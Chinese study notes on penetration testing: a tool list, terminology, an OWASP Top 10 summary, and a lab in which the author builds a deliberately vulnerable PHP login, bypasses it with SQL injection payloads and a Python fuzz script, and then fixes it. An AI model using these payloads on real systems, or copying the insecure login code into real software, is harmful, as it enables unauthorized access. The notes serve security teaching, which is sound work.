## 渗透测试基础

### 一、渗透攻击流程

![image-20220603170707931](https://yang-typora.oss-cn-beijing.aliyuncs.com/202206031732815.png)

### 二、渗透测试主流工具

域名注册信息查询： Whois在线查询目标网络信息DNS和IP，nslookup

在线漏洞搜索引擎： fofa.info，shodan.io，zoomeyes.org（https://www.zoomeye.org/）

指纹识别：CMS识别工具（如：http://whatweb.bugscaner.com/batch.html），操作系统识别工具

综合扫描：Nmap，masscan

网站路径扫描：御剑，WWWSCAN，dirb

主机漏洞扫描：Nessus

WEB应用漏洞扫描：AWVS，AppScan， Xray

代码审计：RIPS，Fortify SCA

抓包分析：wireshark，科来, tcpdump

SQL注入：Sqlmap，XSS扫描：XSStrike 。。。。。

集成攻击平台：Burpsuite，Metasploit，Cobalt Strike

反编译调试工具：IDA PRO, Onlydbg，WinHex，jd-gui， Dcompile….

Shell连接工具：中国菜刀，蚁剑，冰蝎，哥斯拉

系统hash破解：pwdump，Shadow，LC5/JOHN，[http://www.objectif-securite.ch在线破解](http://www.objectif-securite.xn--ch-tl8cj76jj3g7mr/)

内网抓取hash：WCE，Mimikatz(抓取登录过主机的用户)，Procdump+mimikatz，John，Getpass，MSF

网络已公开的各类成熟exp：strusts2工具集，Java反序列化工具，MS08-067等等等

### 三、专业术语解释

**WebShell**：基于Web开发语言（如PHP、Java、Python、C#、Go、JavaScript等）制作的木马程序，大马，小马。

**Shell Code**：也属于一种木马程序，但是只有代码本身，非可执行程序，可以自已加工和编译。具备一定的免杀能力。

**Payload**：有效载荷（在通信协议中，抛开通信协议本身的规则字段，实际传输的数据本身），攻击载荷：具备攻击特征的数据，如GET请求的URL地址参数，或POST的请求正文，HTTP标头的攻击数据包。在渗透测试领域称为攻击载荷。

**肉鸡**：受攻击者远程控制的主机，以前的肉鸡更多是个人电脑，现在很多肉鸡是云服务器。

**POC**：Proof of Concept：概念验证，用于在发现漏洞后，编写程序或Payload进行验证，确认漏洞的存在。

**EXP/Exploit**：漏洞利用

**CC**：Challenge Collapsar， 挑战黑洞，攻击者通过代理服务器或者肉鸡向向受害主机不停地发大量数据包，造成对方服务器资源耗尽，一直到宕机崩溃。

**C2**：Command & Control，主要是指攻击者通过与恶意软件的交互，对被害者进行控制，从而实施恶意活动的含义。

**FUZZ**：模糊测试，用于基于规则或字典等进行快速的不精准的测试，进而发现可能存在漏洞的地方，

**DDOS**：Distributed Deny of Service：分布式，肉鸡，代理，云服务器

**横向移动，内网渗透**：获取到某一台主机权限后，继教在局域网漫游，扫描，进而实现对其他主机的入侵。

**社工**：社会工程学

**社工库**：一些正规或非正归渠道获取到的各类数据，身份信息，家庭信息，教育信息，支付购买、差旅出国等。

**WAF**：Web Application Firewall，进行Web渗透时，需要想办法绕开防火墙，免杀木马的设计等。

**IDS**：Intrusion Detection System：入侵检测系统，用于检测攻击威胁并进行预警

**IPS**：Intrusion Prevention System：在检测的基础上，增加了主动防御的功能

**NGFW**：Next Generation FireWall：下一代防火墙，传统防火墙+IDS+预警+IPS+态势感知+AI………（性能）

**脆弱项**：Weakness：可能存在一些安全风险

**威胁**：Threat：明确存在安全风险

**攻击**：Attack：直接利用了安全漏洞，形成了攻击，甚至获取了权限等

**漏洞**：Vulnerability

**APT**：Advanced Persistent Threat：高级可持续威胁（大型的，综合技术，商业或政治间谍），了解案例和组织

**提权**：将普通权限提升到高级权限

**越权**：张三拥有了李四的权限：

**RCE**：Remote Command/Code Execute 分为远程命令执行 / 远程代码执行

**SRC**：Security Response Center，安全应急响应中心， https://www.anquanke.com/post/id/84608，有时候也叫SRC漏洞（即公共平台的漏洞挖掘任务，是授权挖掘：https://blog.csdn.net/qq_33608000/article/details/122726675）

> 注意：有时候说源也叫src，是source的简写

**SEIM**：Security Event Information Management System：安全事件管理平台，态势感知（数据采集、数据分析展示）

**安全左移**：将安全提前到研发阶段（安全分析、安全设计、安全架构、安全编码、安全测试）

**SDL**：Security Development Lifecycle，Software Development Lifecycle。安全分析、安全设计、安全架构、安全编码、安全测试、渗透测试、安全防御、安全运营。

### 四、漏洞库

CVE：http://cve.mitre.org/cve/search_cve_list.html，了解一下MITRE：https://zhuanlan.zhihu.com/p/162799295

CWE：http://cwe.mitre.org/data/definitions/1337.html，https://blog.csdn.net/weixin_43500506/article/details/114656358

OWASP：https://blog.csdn.net/lxc408863575/article/details/120219572， https://owasp.org/www-project-top-ten/

CNVD：https://www.cnvd.org.cn/

CNNVD：http://www.cnnvd.org.cn/

漏洞盒子：https://www.vulbox.com/

补天：https://www.butian.net/

ExploitDB：https://www.exploit-db.com/

## Owasp Top 10

#### 1、失效的访问控制

[**A01:2021-Broken Access Control**](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) moves up from the fifth position; 94% of applications were tested for some form of broken access control. The 34 Common Weakness Enumerations (CWEs) mapped to Broken Access Control had more occurrences in applications than any other category.

从第五位上升；94% 的应用程序都经过了某种形式的破坏访问控制的测试。映射到 Broken Access Control 的 34 个 CWE 在应用程序中出现的次数比任何其他类别都多。

**场景 #1：**应用程序在访问帐户信息的 SQL 调用中使用未经验证的数据：

```
pstmt.setString(1, request.getParameter("acct"));结果集结果 = pstmt.executeQuery();
```

攻击者只需修改浏览器的“acct”参数即可发送他们想要的任何帐号。如果没有正确验证，攻击者可以访问任何用户的帐户。

https://example.com/app/accountInfo?acct=notmyacct

**场景#2：**攻击者只是强制浏览到目标 URL。访问管理页面需要管理员权限。

```
https://example.com/app/getappInfo https://example.com/app/admin_getappInfo
```

如果未经身份验证的用户可以访问任一页面，则这是一个缺陷。如果非管理员可以访问管理页面，这是一个缺陷。

#### 2、加密失败

[**A02:2021-Cryptographic Failures**](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) shifts up one position to #2, previously known as Sensitive Data Exposure, which was broad symptom rather than a root cause. The renewed focus here is on failures related to cryptography which often leads to sensitive data exposure or system compromise.

上移一位至 #2，以前称为敏感数据泄露，这是广泛的症状而不是根本原因。此处重新关注与密码学相关的漏洞，这些漏洞通常会导致敏感数据泄露或系统受损。

**场景#1**：应用程序使用自动数据库加密对数据库中的信用卡号进行加密。但是，此数据在检索时会自动解密，从而允许 SQL 注入缺陷以明文形式检索信用卡号。

**场景#2**：站点不使用或对所有页面强制执行 TLS 或支持弱加密。攻击者监视网络流量（例如，在不安全的无线网络中），将连接从 HTTPS 降级为 HTTP，拦截请求并窃取用户的会话 cookie。然后攻击者重放这个 cookie 并劫持用户的（经过身份验证的）会话，访问或修改用户的私人数据。除了上述之外，他们还可以更改所有传输的数据，例如，汇款的接收者。

**场景#3**：密码数据库使用未加盐或简单的哈希来存储每个人的密码。文件上传缺陷允许攻击者检索密码数据库。所有未加盐的哈希值都可以通过预先计算的哈希值彩虹表公开。由简单或快速散列函数生成的散列可能会被 GPU 破解，即使它们被加盐。

#### 3、注入

[**A03:2021-Injection**](https://owasp.org/Top10/A03_2021-Injection/) slides down to the third position. 94% of the applications were tested for some form of injection, and the 33 CWEs mapped into this category have the second most occurrences in applications. Cross-site Scripting is now part of this category in this edition.

下滑到第三位。94% 的应用程序都针对某种形式的注入进行了测试，映射到此类别的 33 个 CWE 在应用程序中的出现次数排名第二。跨站点脚本攻击现在是此版本中此类别的一部分。

> 不仅是SQL注入、还有命令注入、协议流注入、文件注入、代码注入等类别

**场景 #1：**应用程序在构建以下易受攻击的 SQL 调用时使用不受信任的数据：

> String query = “SELECT * FROM accounts WHERE custID=’” + request.getParameter(“id”) + “‘“;

**场景#2：**类似地，应用程序对框架的盲目信任可能会导致查询仍然存在漏洞（例如，Hibernate 查询语言 (HQL)）：

> Query HQLQuery = session.createQuery(“FROM accounts WHERE custID=’” + request.getParameter(“id”) + “‘“);

在这两种情况下，攻击者都会修改浏览器中的 ‘id’ 参数值以发送：’ 或 ‘1’=’1。例如：

http://example.com/app/accountView?id=‘ 或 ‘1’=’1

这将更改两个查询的含义以返回帐户表中的所有记录。更危险的攻击可能会修改或删除数据，甚至调用存储过程。

#### 4、不安全的设计

[**A04:2021-Insecure Design**](https://owasp.org/Top10/A04_2021-Insecure_Design/) is a new category for 2021, with a focus on risks related to design flaws. If we genuinely want to “move left” as an industry, it calls for more use of threat modeling, secure design patterns and principles, and reference architectures.

是2021 年的一个新类别，重点关注与设计缺陷相关的风险。如果我们真的想作为一个行业“安全左移”，就需要更多地使用威胁建模、安全设计模式和原则以及参考架构。

**场景 #1：**凭证恢复工作流程可能包括“问答”，这是 NIST 800-63b、OWASP ASVS 和 OWASP Top 10 所禁止的。不能将问答作为多个人身份的证据可以知道答案，这就是为什么它们被禁止。此类代码应删除并替换为更安全的设计。

**场景#2：**连锁影院允许团体预订折扣，并且在要求押金之前最多有 15 名参与者。攻击者可以对该流程进行威胁建模，并测试他们是否可以在几次请求中一次预订 600 个座位和所有电影院，从而造成巨大的收入损失。

**场景 #3：**零售连锁店的电子商务网站没有针对由黄牛运行的机器人提供保护，这些机器人购买高端显卡以转售拍卖网站。这对视频卡制造商和零售连锁店主造成了可怕的宣传，并与无法以任何价格获得这些卡的爱好者之间产生了仇恨。仔细的反机器人设计和域逻辑规则，例如在可用性的几秒钟内进行的购买，可能会识别出不真实的购买并拒绝此类交易。

#### 5、安全配置错误

[**A05:2021-Security Misconfiguration**](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) moves up from #6 in the previous edition; 90% of applications were tested for some form of misconfiguration. With more shifts into highly configurable software, it’s not surprising to see this category move up. The former category for XML External Entities (XXE) is now part of this category.

从上一版的第 6 位上升；90% 的应用程序都经过了某种形式的错误配置测试。随着更多定制性高度可配置的软件，看到这一类别上升也就不足为奇了。XML 外部实体 (XXE) 的前一个类别现在属于此类别。

**场景#1：**应用程序服务器带有未从生产服务器中删除的示例应用程序。这些示例应用程序具有攻击者用来破坏服务器的已知安全漏洞。假设这些应用程序之一是管理控制台，并且默认帐户未更改。在这种情况下，攻击者使用默认密码登录并接, 管。

**场景#2：**服务器上没有禁用目录列表。攻击者发现他们可以简单地列出目录。攻击者找到并下载已编译的 Java 类，对其进行反编译和逆向工程以查看代码。然后攻击者发现应用程序中存在严重的访问控制缺陷。

**场景#3：**应用服务器的配置允许将详细的错误消息（例如堆栈跟踪）返回给用户。这可能会暴露敏感信息或潜在缺陷，例如已知易受攻击的组件版本。

**场景#4：**云服务提供商拥有其他 CSP 用户对 Internet 开放的默认共享权限。这允许访问存储在云存储中的敏感数据。

#### 6、易受攻击和过时的组件

[**A06:2021-Vulnerable and Outdated Components**](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/) was previously titled Using Components with Known Vulnerabilities and is #2 in the Top 10 community survey, but also had enough data to make the Top 10 via data analysis. This category moves up from #9 in 2017 and is a known issue that we struggle to test and assess risk. It is the only category not to have any Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploit and impact weights of 5.0 are factored into their scores.

之前的标题是 使用具有已知漏洞的组件，在行业调查中排名第二，但也有足够的数据通过数据分析进入前 10 名。该类别从 2017 年的第 9 位上升，是我们难以测试和评估风险的已知问题。它是唯一没有任何 CVE 映射到包含的 CWE 的类别，因此默认的利用和影响权重 5.0 被计入他们的分数。

**场景#1：**组件通常以与应用程序本身相同的权限运行，因此任何组件中的缺陷都可能导致严重影响。此类缺陷可能是偶然的（例如，编码错误）或有意的（例如，组件中的后门）。发现的一些可利用组件漏洞的示例是：

- CVE-2017-5638 是一个 Struts 2 远程代码执行漏洞，可以在服务器上执行任意代码，已被归咎于重大漏洞。
- 虽然物联网 (IoT) 通常很难或不可能修补，但修补它们的重要性可能很大（例如，生物医学设备）。

有一些自动化工具可以帮助攻击者找到未打补丁或配置错误的系统。例如，Shodan IoT 搜索引擎可以帮助您找到仍然存在 2014 年 4 月修补的 Heartbleed 漏洞的设备。

#### 7、认证和授权失败

[**A07:2021-Identification and Authentication Failures**](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) was previously Broken Authentication and is sliding down from the second position, and now includes CWEs that are more related to identification failures. This category is still an integral part of the Top 10, but the increased availability of standardized frameworks seems to be helping.

以前是 Broken Authentication 失效的身份认证并且从第二位下滑，现在包括与识别失败更多相关的 CWE。这个类别仍然是前 10 名的一个组成部分，但标准化框架的可用性增加似乎有所帮助。

**场景#1：**凭证填充（使用已知密码列表）是一种常见的攻击。假设应用程序没有实施自动化威胁或凭证填充保护。在这种情况下，应用程序可以用作密码预言机来确定凭证是否有效。

**场景#2：**大多数身份验证攻击是由于继续使用密码作为唯一因素而发生的。一经考虑，最佳实践、密码轮换和复杂性要求会鼓励用户使用和重复使用弱密码。建议组织按照 NIST 800-63 停止这些做法并使用多因素身份验证。

**场景 #3：**应用程序会话超时设置不正确。用户使用公共计算机访问应用程序。用户没有选择“注销”，而是简单地关闭浏览器选项卡并走开。攻击者在一个小时后使用同一个浏览器，而用户仍然通过身份验证。

#### 8、软件和数据完整性故障

[**A08:2021-Software and Data Integrity Failures**](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/) is a new category for 2021, focusing on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity. One of the highest weighted impacts from Common Vulnerability and Exposures/Common Vulnerability Scoring System (CVE/CVSS) data mapped to the 10 CWEs in this category. Insecure Deserialization from 2017 is now a part of this larger category.

是 2021 年的一个新类别，专注于在不验证完整性的情况下做出与软件更新、关键数据和 CI/CD 管道相关的假设。CVE/CVSS 数据的最高加权影响之一映射到该类别中的 10 个 CWE。2017 年的不安全反序列化现在是这一更大类别的一部分。

**场景 #1 不安全的反序列化：** React 应用程序调用一组 Spring Boot 微服务。作为函数式程序员，他们试图确保他们的代码是不可变的。他们提出的解决方案是序列化用户状态并在每个请求中来回传递它。攻击者注意到“R00”Java 对象签名并使用 Java Serial Killer 工具在应用服务器上获取远程代码执行权。

**场景 #2 无需签名即可更新：**许多家用路由器、机顶盒、设备固件和其他固件不通过签名固件验证更新。未签名固件是攻击者越来越多的目标，预计只会变得更糟。这是一个主要问题，因为很多时候除了在未来版本中修复并等待以前的版本过时之外，没有任何补救机制。

**场景#3 SolarWinds 恶意更新**：众所周知，国家会攻击更新机制，最近的一次著名攻击是 SolarWinds Orion 攻击。开发该软件的公司拥有安全的构建和更新完整性流程。尽管如此，这些还是能够被破坏，并且在几个月的时间里，该公司向 18,000 多个组织分发了一个高度针对性的恶意更新，其中大约 100 个组织受到了影响。这是历史上此类性质最深远、最重大的违规行为之一。

#### 9、安全日志记录和监控失败

[**A09:2021-Security Logging and Monitoring Failures**](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/) was previously Insufficient Logging & Monitoring and is added from the industry survey (#3), moving up from #10 previously. This category is expanded to include more types of failures, is challenging to test for, and isn’t well represented in the CVE/CVSS data. However, failures in this category can directly impact visibility, incident alerting, and forensics.

以前是 日志记录和监控不足，是从行业调查 (#3) 中添加的，从之前的 #10 上升。此类别已扩展为包括更多类型的故障，难以测试，并且在 CVE/CVSS 数据中没有得到很好的体现。但是，此类故障会直接影响可见性、事件警报和取证。

**场景#1：**由于缺乏监控和日志记录，一家儿童健康计划提供商的网站运营商无法检测到违规行为。外部方通知健康计划提供者，攻击者访问并修改了超过 350 万儿童的数千份敏感健康记录。事后审查发现网站开发人员没有解决重大漏洞。由于没有对系统进行日志记录或监控，数据泄露可能自 2013 年以来一直在进行，时间超过七年。

**场景#2：**印度一家大型航空公司发生数据泄露事件，涉及数百万乘客超过十年的个人数据，包括护照和信用卡数据。数据泄露发生在第三方云托管服务提供商处，该提供商在一段时间后将泄露事件通知了航空公司。

**场景 #3：**一家主要的欧洲航空公司遭遇了 GDPR 可报告的违规行为。据报道，该漏洞是由攻击者利用的支付应用程序安全漏洞引起的，他们收集了超过 400,000 条客户支付记录。该航空公司因此被隐私监管机构罚款 2000 万英镑。

#### 10、服务器请求伪造

[**A10:2021-Server-Side Request Forgery**](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/) is added from the Top 10 community survey (#1). The data shows a relatively low incidence rate with above average testing coverage, along with above-average ratings for Exploit and Impact potential. This category represents the scenario where the security community members are telling us this is important, even though it’s not illustrated in the data at this time.

是从行业调查 (#1) 中添加的。数据显示发生率相对较低，测试覆盖率高于平均水平，并且利用和影响潜力的评级高于平均水平。此类别代表行业专业人士告诉我们这很重要的场景，即使目前数据中没有说明。

**场景#1：**端口扫描内部服务器。如果网络架构是未分段的，攻击者可以绘制内部网络，并根据连接结果或连接或拒绝 SSRF 负载连接所用的时间来确定内部服务器上的端口是打开还是关闭。

**场景#2：**敏感数据暴露。攻击者可以访问本地文件，例如 或内部服务以获取敏感信息。

**场景#3：**访问云服务的元数据存储。大多数云提供商都有元数据存储，例如http://169.254.169.254/。攻击者可以读取元数据来获取敏感信息。

**场景#4：**破坏内部服务——攻击者可以滥用内部服务进行进一步的攻击，例如远程代码执行 (RCE) 或拒绝服务 (DoS)  

## SQL注入漏洞

### 一、环境准备

1、在Linux主机上准备一套Xampp：模拟攻防

2、在VSCode利用Remote Development进行远程调试

3、在Lampp的htdos目录下创建security目录，用于编写服务器PHP代码

### 二、编写Login.html

### 三、编写Login.php

```php
<?php
 // 获取用户提交的登录请求数据
$username = $_POST['username'];
$password = $_POST['password'];
$vcode = $_POST['vcode'];

// 验证码的验证，OWASP-认证和授权失败
if($vcode !== '0000'){
    die("vcode-error");    //向前端输出一条消息同时结束代码的运行
}

// 连接数据库
$conn = mysqli_connect('127.0.0.1','root','123456','learn') or die("数据库连接不成功！"); 

// 设置数据库的编码格式
mysqli_query($conn,"set names utf8;");

$sql = "select * from user where username ='$username' and password = '$password'";
$result = mysqli_query($conn,$sql);     //$result称之为结果集

// 以下代码没用进行爆破的防护(OWASP-认证和授权失败)

if (mysqli_num_rows($result) == 1){
     echo "login-pass<br/>";

    echo "<script>location.href='welcome.php'</script>";
}
else{
    // echo "login-fail<br/>";
    echo "<script>location.href='login.html'</script>";
}

//关闭数据库
mysqli_close($conn)
?>
```

### 四、编写一个登录后才能访问的welcome.php

```php
<?php
// OWASP-失效访问控制
    // 修复方法：在显示文本之前，先进行SESSION变量的验证
include "common.php";
//isset() 函数用于检测变量是否已设置并且非 NULL。
if (!isset($_SESSION['islogin']) or $_SESSION['islogin'] != 'true'){
    die ("请登录后再访问此页面</br>");
}
echo '欢迎来到安全测试平台';
?>
```

### 五、进行登录的渗透测试

```sql
在登录界面输入一个单引号[']作为用户名，Burp响应如下:

<b>Warning</b>:  mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in <b>/opt/lampp/htdocs/security/login.php</b>

以上响应出现MySQL报错信息，上述报错信息存在两个漏洞：
	1、单引号可以成功引起SQL语句报错，说明后台没有专门对单引号进行处理
	select * from user where username ='$username' and password = '$password'
	正常情况：select * from user where username ='root' and password = '$password'
	攻击情况：select * from user where username =''' and password = '$password'
    攻击Payload：
             username：x' or userid=1#'
    Post正文：
             username=x' or+userid=1#'&password=111111&vcode=0000
    select * from user where username ='x' or userid=1#'' and password = '$password'        
             
	2、在报错信息里泄露了敏感信息
	/opt/lampp/htdocs/security/login.php（当前代码的绝对路径）
```

### 六、总结

上述代码一共发现了6个漏洞

1、welcome.php页面谁都可以访问，没有进行登录判断(中)
2、在登录界面输入'作为用户名，报错信息存在login.php的绝对路径，暴露了系统后台的敏感信息(低)
3、保存用户信息的数据表中，密码字段是明文保存的，不够安全(中)
4、登录界面可以进行SQL注入，进而轻易实现登录(高)
5、login.php页面使用了万能验证码(中)
6、登录功能可以被爆破，没有进行爆破防护(中)

## SQL注入-登录漏洞-基础修复

### 一、使用Python进行注册测试

```python
import requests
# 利用Python对PHP的登录界面进行Fuzz测试

def login_fuzz():
    # 先使用单引号进行测试
    url = 'http://192.168.72.148/security/login.php'
    data = {'username': "'", 'password': '666666', 'vcode': '0000'}
    resp = requests.post(url=url, data=data)

    if 'Warning' in resp.text:
        print("本登录功能可能存在SQL注入漏洞，可以尝试")
        # 如果单引号存在利用嫌疑，则继续利用
        payload_list = ["x' or id=1#", "x' or userid=1#", "x' or userid=2#"]
        for username in payload_list:
            data = {'username': username, 'password': '666666', 'vcode': '0000'}
            resp = requests.post(url=url, data=data)
            if "login-fail" not in resp.text:
                print(f'登录成功，payload为：{data}')
    else:
        print('通过试探，发现后台界面对单引号不感兴趣;')

if __name__ == '__main__':
    login_fuzz()
```

### 二、任意访问授权界面

​		welcome.php页面谁都可以访问，没有进行登录判断，该页面是登录后才能访问，所以在该页面需要进行登录判断，代码修改为：

1、在common.php中添加session_start()，让其他页面引入，便于直接使用Session

```php
<?php
session_start();
function create_connection(){
    // 连接数据库
    $conn = mysqli_connect('127.0.0.1','root','123456','learn') or die("数据库连接不成功！"); 
    // 设置数据库的编码格式
    mysqli_query($conn,"set names utf8;");
    mysqli_set_charset($conn,'utf8');
    return $conn;
}

?>
```

2、在welcome.php页面中，源代码修改为

```php
<?php
// OWASP-失效访问控制
    // 修复方法：在显示文本之前，先进行SESSION变量的验证
include "common.php";
//isset() 函数用于检测变量是否已设置并且非 NULL。
if (!isset($_SESSION['islogin']) or $_SESSION['islogin'] != 'true'){
    die ("请登录后再访问此页面</br>");
}
echo '欢迎来到安全测试平台';
?>
```

3、在login.php中，登录成功后添加以下代码

```php
if (mysqli_num_rows($result) == 1){
    echo "login-pass<br/>";
    // 登录成功后，记录SESSION变量
    $_SESSION['username'] = $username;
    $_SESSION['islogin'] = 'true';
    echo "<script>location.href='welcome.php'</script>";
}
```

### 三、修复login.php暴露文件路径

​		当在用户名输入单引号时，会引起后台报错，一方面说明后台没有对单引号进行转义处理，导致单引号可以被注入到SQL语句中，进而导致SQL语句中存在单独的一个单引号，SQL语句无法有效闭合，发生错误。同时，还将该代码的绝对路径暴露出来，属于敏感信息，应该将其屏蔽，修复代码如下：

```php
$result = mysqli_query($conn,$sql) or die("SQL语句执行错误!") ;
```

### 四、修改用户表密码为明文

#### 1、使用md5函数 

```php
$source = 'YikJiang';
echo md5($source);

//提示一：user表中password字段必须是32+位
//提示二：在用户注册时，必须使用md5函数将密码加密保存
```

## SQL注入-登录漏洞-SQL注入防护

> 从代码和SQL语句的逻辑层面进行考虑，不能轻易让密码对比失效
>
> 基于将用户输入的引号（单引号和双引号）进行转义处理的前提，可以使用PHP内置函数addslashes进行强制转义

### 一、登录SQL语句的逻辑问题

1. 该SQL语句在实现登录操作时，存在严重的逻辑问题，用户名和密码的对比不应该放在同一条SQL语句中。
2. 应先通过用户名查询user表，如果确实找到一条记录（用户名唯一的情况下），找到记录后再进行密码的单独对比。

修复后的代码如下：

```php
$sql = "select * from user where username ='$username'";
$result = mysqli_query($conn,$sql) or die("SQL语句执行错误!") ;     //$result称之为结果集

// 以下代码没用进行爆破的防护(OWASP-认证和授权失败)
//如果用户名真实存在，刚好找到一条，则再单独进行密码比较，即使用户名出现SQL注入漏洞，但是只要密码不正确，也无法登录
if (mysqli_num_rows($result) == 1){
    // $row = mysqli_fetch_all($result,MYSQLI_ASSOC);       //索引数组＋下标数组
    // $row = mysqli_fetch_row($result);       //索引数组
    $row = mysqli_fetch_assoc($result);     //下标数组
    // var_dump($row);
    if ($password == $row['password']){
        echo "login-pass<br/>";
        // 登录成功后，记录SESSION变量
        $_SESSION['username'] = $username;
        $_SESSION['islogin'] = 'true';
        echo "<script>location.href='welcome.php'</script>";
    }
    else{
        echo "login-fail";
    }

}
else{
    echo "login-fail<br/>";
    echo "<script>location.href='login.html'</script>";
}
```

### 二、使用addslashes函数

​	addslashes函数可以将字符串中的单引号、双引号、反斜杠、NULL值自动添加转义符，从而防止SQL注入中对单引号和双引号的预防。

原始SQL语句如下：

```sql
select * from user where username ='$username' and password = '$password'
```

如果用户输入`x' or userid=1#'`，则SQL语句变成：

```sql
select * from user where username ='x' or userid=1#'' and password = '$password'
```

如果使用`addslashes`强制为用户输入添加转义符，则变成：

```sql
select * from user where username ='x\' or userid=1#\'' and password = '$password'
```

上述SQL语句的用户名为：x\\' or userid=1#\\'

### 三、使用MySQL面向对象方式

#### 1、面向过程方式

> 使用PHP自带的函数

```php
// 面向过程的方式
function create_connection(){
    // 连接数据库
    $conn = mysqli_connect('127.0.0.1','root','123456','learn') or die("数据库连接不成功！"); 
    // 设置数据库的编码格式
    mysqli_query($conn,"set names utf8;");
    mysqli_set_charset($conn,'utf8');
    return $conn;
}
// 将数据库查询的结果集中的数据取出，保存到一个数组当中
$row = mysqli_fetch_assoc($result);
//mysqli_fetch_all默认使用索引数组，也可以设定参数强制使用关联数组
// $row = mysqli_fetch_all($result,MYSQLI_ASSOC);      
// $row = mysqli_fetch_row($result);       //索引数组
```

#### 2、面向对象方式

```php
function create_connection_oop(){
    
    $conn = new mysqli('127.0.0.1','root','123456','learn') or die("数据库连接不成功！");
    // 两种方法设置字符集
    // 1、$conn->query("set names utf8;")
    // 2、
    $conn->set_charset('utf8');
    return $conn;
}

// 执行SQL语句
function test_mysqli_opp(){
    $conn = create_connection_oop();
    $sql = "select * from user where userid < 6";
    $result = $conn->query($sql);
    //获取结果集行数
    echo $result->num_rows."</br>";
    // 获取结果集数组
    // 使用关联数组
    $rows = $result->fetch_all(MYSQLI_ASSOC);
    // var_dump($rows);
    // 遍历数组
    foreach ($rows as $row){
        echo "username:". $row['username'] . ",passwrod" . $row['password'] . "</br>";
    }
}
```

### 四、使用MySQL预处理功能

#### 1、预处理功能的用法

​	预处理的过程，就是先交给SQL数据库进行SQL语句的准备，准备好后再将SQL语句中的参数进行值的替换，引号会进行转义处理，将所有参数变成普通字符串，再进行第二次正式的SQL语句执行。MySQL的预处理既支持面向过程，也支持面向对象方式，但是我们后续直接使用面向对象的方式。

```php
$conn = create_connection_oop();
$sql = "select userid,username,password,role from user where username= ?";
$stmt = $conn->prepare($sql);
$stmt->bind_param("s",$username);       // 绑定查询参数
$stmt->bind_result($userid,$username2,$password2,$role);    // 绑定结果参数
$stmt->execute();       // 执行
$stmt->store_result();  //调用结果
```

#### 2、使用预处理来防止SQL注入

```

```

#### 3、配置MySQL临时日志查看SQL语句

​	在MySQL数据库中运行以下语句，开启临时日志，将日志信息保存到表格mysql数据库的general_log表中。

```sql
#开启
use mysql;
set global log_output = 'TABLE';
set global general_log = 'ON';
#确认
show variables like "general_log";
```

> MySQLi的预处理功能同样支持面向过程和面向对象
>
> 除了MySQLi用于处理数据库外，在PHP中还有最传统的MySQL和PDO两种方式

## SQL注入-登录漏洞-验证码处理

### 一、验证码生成原理

​	核心目的是确保是人在使用系统，图片验证码、拖动验证码、拼图验证码、问答验证码、计算验证码等。

### 二、验证码代码实现

> 添加源代码vcode.php，基于PHP绘制基础图片，生成验证码，然后将该验证码保存到Session变量

```php
<?php
// 利用Session保存图片验证码
session_start();
getCode();

// 生成验证码图片

function getCode($vlen=4 , $width = 80 , $height = 25){
    // 定义响应类型为PNG图片
    header("content-type:image/png");

    // 生成随机验证码字符串,并将其保存于Session中
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $vcode =substr(str_shuffle($chars),0,$vlen);
    $_SESSION['vcode'] = $vcode;

    // 定义图片并设置背景色RGB为100,200,100
    $image = imagecreate($width,$height);       // 创建一个画布
    $imageColor = imagecolorallocate($image,100,200,100);

    // 以RGB=0,0,0,的颜色回值黑色的文字
    $color = imagecolorallocate($image,0,0,0);
    imagestring($image,5,20,5,$vcode,$color);       // 5:字体大小  20:距离x轴的距离   5:距离y轴的距离

    // 生成随机位置的干扰点
    for($i=0;$i<50;$i++){
        imagesetpixel($image,rand(0,$width),rand(0,$height),$color);
    }

    // 输出图片验证码,并将其在内存的数据销毁
    imagepng($image);
    imagedestroy($image);

}

?>
```

### 三、修改HTML页面调用验证码

> 修改login.html

```php+HTML
input[name='vcode']{
	width: 200px;
}
<body style="background-image:url(./image/1.png); background-size:cover;">
        <div class="login top-100 font-30">YikJiang</div>
        <form action="login-3.php" method="post">
            <div class="login">
                <input type="text" name="username" />
            </div>
            <div class="login">
                <input type="password" name="password" />
            </div>
            <div class="login">
                <input type="text" name="vcode" /> &nbsp;&nbsp;&nbsp;
                <img src="vocde.php"/>
            </div>

            <div class="login">
                <!--*type="submit" 代表按钮类型为提交表单-->
                <button type="submit">登录</button>
            </div>
        </form>
    <div class="footer top-100">版权所有©YikJiang 沪ICP备18011293号</div>
</body>
</html>
```

### 四、登录的验证码校验

> 修改login.php

```php
if(strtoupper($_SESSION['vcode'])  != strtoupper($vcode) ){
    die("vcode-error");    //向前端输出一条消息同时结束代码的运行
}
```

> 验证码一旦生成后，不一定必须保存在Session中，任何可以存储数据的方式均可以。比如数据库、文件、内存中，或者保存在Redis缓存服务器中。比如短信验证码，通常会有一个时间限制（5分钟内有效），最好的解决方案就是使用Redis缓存，并设置Key的过期时间

## SQL注入-登录漏洞-验证码防护

### 一、Session验证码存在的漏洞

​	当验证码保存在Session变量中，每一次刷新登录界面，会重新访问一次vcode.php，但是如果不刷新页面，而是直接通过Python、Fiddler、Burp等直接发送登录请求，则此时验证码在Session中会保持最后一个，从而只需要在发送登录请求的时候将验证码设置为最后一个即可。

### 二、Session验证码的防护方法

> 验证码每使用一次都必须将其清空，不允许继续给下一次使用

```php
if(strtoupper($_SESSION['vcode'])  != strtoupper($vcode) ){
    die("vcode-error");    //向前端输出一条消息同时结束代码的运行
}
else{
    // 验证码输入成功后，再清空本次Session中的验证码 
    // 清空本次Session中的验证码
    unset($_SESSION['vcode']);      //方法一：直接消除
    //方法二：替换为空值,不能直接设置为空字符串，否则也可以在请求上提交一个空的验证码，实现绕过
    // $_SESSION['vcode'] = '';       

}
// 无论验证码是否正确,每提交一次请求均清空一次,但是会增加服务器的负担.
unset($_SESSION);
```

### 三、避免使用Cookie验证码

